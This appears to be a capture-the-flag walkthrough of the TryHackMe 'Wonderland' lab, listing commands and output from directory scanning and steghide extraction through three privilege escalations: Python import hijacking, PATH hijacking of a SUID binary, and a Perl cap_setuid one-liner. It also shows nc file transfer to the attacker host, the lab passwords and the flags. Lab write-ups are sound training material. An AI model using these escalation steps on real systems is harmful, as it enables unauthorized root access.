```
gobuster dir --url http://10.10.122.82/ --wordlist /usr/share/wordlists/dirb/common.txt -t 30
found /r then /a so /r/a/b/b/i/t
inspect source alice:HowDothTheLittleCrocodileImproveHisShiningTail --> ssh username:pass
or from image
$ wget http://10.10.125.113/img/white_rabbit_1.jpg
$ steghide info white_rabbit_1.jpg 
"white_rabbit_1.jpg":
  format: jpeg
  capacity: 99.2 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "hint.txt":
    size: 22.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
$ steghide extract -sf white_rabbit_1.jpg 
Enter passphrase: 
wrote extracted data to "hint.txt".
$ cat hint.txt 
follow the r a b b i t

No user flag (usually user.txt) but a root flag (root.txt). Seriously? Remember the hint, everything is upside down. Wouldn’t the user flag be in /root? 

alice@wonderland:~$ pwd
/home/alice
alice@wonderland:~$ ls
root.txt  walrus_and_the_carpenter.py
alice@wonderland:~$ cat root.txt
cat: root.txt: Permission denied
alice@wonderland:~$ cd /root
alice@wonderland:/root$ ls
ls: cannot open directory '.': Permission denied
alice@wonderland:/root$ ls
ls: cannot open directory '.': Permission denied
alice@wonderland:/root$ ls -l /root/user.txt
-rw-r--r-- 1 root root 32 May 25  2020 /root/user.txt
alice@wonderland:/root$ cat /root/user.txt
thm{"Curiouser and curiouser!"}
alice@wonderland:/root$ 

***priv_esc***
sudo -l
alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
Well, at this stage, the only possibility seems to hijack the import random statement from the python script to import our own library.

Let’s hook the import as follows: 
alice@wonderland:~$ cd /home/alice/
alice@wonderland:~$ cat > random.py << EOF
> import os
> os.system("/bin/bash")
> EOF
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~
rabbit@wonderland:~$ pwd
/home/alice
rabbit@wonderland:~$ cd /home/rabbit
rabbit@wonderland:/home/rabbit$ ls -la
total 40
drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 .
drwxr-xr-x 6 root   root    4096 May 25  2020 ..
lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
rabbit@wonderland:/home/rabbit$ file teaParty
teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped
By using ltrace against it it seems it is just printing some strings:
abbit@wonderland:/home/rabbit$ ltrace ./teaParty
setuid(1003)                                        = -1
setgid(1003)                                        = -1
puts("Welcome to the tea party!\nThe Ma"...Welcome to the tea party!
The Mad Hatter will be here soon.
)        = 60
system("/bin/echo -n 'Probably by ' && d"...Probably by Sun, 31 Jul 2022 02:49:36 +0000
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                              = 0
puts("Ask very nicely, and I will give"...Ask very nicely, and I will give you some tea while you wait for him
)         = 69
getchar(1, 0x557b8e2ce260, 0x7f3907c658c0, 0x7f3907988154

**copy**
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lvnp 4444 > teaParty 

rabbit@wonderland:/home/rabbit$ nc 10.18.1.77 4444 < teaParty
┌──(kali㉿kali)-[~/Downloads]
└─$ ls
1.tar                     hash                          robert_ssh.txt
46635.py                  hashes.txt                    SAM
backdoors                 hash.txt                      shadow.txt
backup.zip                id_rsa                        SharpGPOAbuse
buildscript.sh            id_rsa_robert                 SharpGPOAbuse.exe
Chankro                   key                           shell.php
cracking.txt              KIBA                          socat
credential.pgp            Lian_Yu                       solar_log4j
CustomerDetails.xlsx      linpeas.sh                    startup.bat
CustomerDetails.xlsx.gpg  Market_Place                  SYSTEM
Devservice.exe            NAX                           system.txt
download.dat              overpass2.pcapng              teaParty

void main() {
    setuid(0x3eb);
    setgid(0x3eb);
    puts("Welcome to the tea party!\nThe Mad Hatter will be here soon.");
    system("/bin/echo -n 'Probably by ' && date --date='next hour' -R");
    puts("Ask very nicely, and I will give you some tea while you wait for him");
    getchar();
    puts("Segmentation fault (core dumped)");
    return;
}

As we can see, the executable will display a fake segmentation fault message. It is run as root and has the SUID bit set. It manipulates the date function to echo the current datetime + 1 hour. This is likely something we can exploit by hooking the date function.

rabbit@wonderland:/home/rabbit$ cat > date << EOF
> #!/bin/bash
> /bin/bash
> EOF
rabbit@wonderland:/home/rabbit$ chmod +x date
rabbit@wonderland:/home/rabbit$ ls
date  teaParty
rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
hatter@wonderland:/home/rabbit$ 

From hatter to root (privesc)

Now that we have successfully switched to the hatter user, let’s check what we have in our home directory:

hatter@wonderland:/home/rabbit$ cd /home/hatter/
hatter@wonderland:/home/hatter$ cat password.txt 
WhyIsARavenLikeAWritingDesk?

This is our password. We can check our privileges, but we have none, actually:

hatter@wonderland:/home/hatter$ sudo -l
[sudo] password for hatter: 
Sorry, user hatter may not run sudo on wonderland.

Also checked crontab, but we have none, checked the files owned by hatter, nothing we can exploit. Let’s upload linpeas. Make sure you run all tests (linpeas.sh -a).

The interesting stuff is about Perl:

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep

Go to https://gtfobins.github.io/gtfobins/perl/ to check the capabilities section of Perl. Let’s get root access:

hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
root@wonderland:~# whoami
root
root@wonderland:~# cat /home/alice/root.txt 
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}

Root flag: thm{Twinkle, twinkle, little bat! How I wonder what you’re at!} 

It appears that Perl has capabilities enabled:

┌──(kali㉿kali)-[~]
└─$ ssh hatter@10.10.122.82
hatter@10.10.122.82's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul 31 02:28:43 UTC 2022

  System load:  0.0                Processes:           84
  Usage of /:   18.9% of 19.56GB   Users logged in:     0
  Memory usage: 34%                IP address for eth0: 10.10.122.82
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
after executing linpeas.sh
wget 10.18.1.77/linpeas.sh
chmod +x linpeas.sh

Files with capabilities (limited to 50):
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep


hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
root@wonderland:~# ls
linpeas.sh  linpeas.sh.1  password.txt
root@wonderland:~# cd /home/alice
root@wonderland:/home/alice# ls
random.py  root.txt  walrus_and_the_carpenter.py
root@wonderland:/home/alice# cat root.txt 
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
root@wonderland:/home/alice# 

```

[[TOR]]